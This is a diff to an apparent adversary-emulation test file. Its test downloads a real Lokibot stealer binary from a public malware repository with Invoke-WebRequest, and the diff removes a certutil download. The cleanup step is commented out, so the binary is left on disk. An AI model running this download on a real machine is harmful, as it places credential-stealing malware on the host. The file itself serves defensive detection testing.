@@ -13,9 +13,8 @@ atomic_tests:
         Write-Host "[*] Simulating download of lookbot.exe from public forum..."
         $url = "https://github.com/Da2dalus/The-MALWARE-Repo/raw/master/Stealer/Lokibot.exe"
         $out = "C:\Temp\lokibot.exe"
+        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
 
-       New-Item -Path "C:\Temp" -ItemType Directory -Force | Out-Null
-       certutil -urlcache -split -f $url $out
         Write-Host "[+] lookbot .exe downloaded to $lookbot_exe"
       cleanup_command: |
         #Remove-Item "C:\Temp\lookbot.exe" -Force -ErrorAction SilentlyContinue
@@ -240,5 +239,4 @@ atomic_tests:
     attack_technique:
       - T1070.001
       - T1070.004
-
 
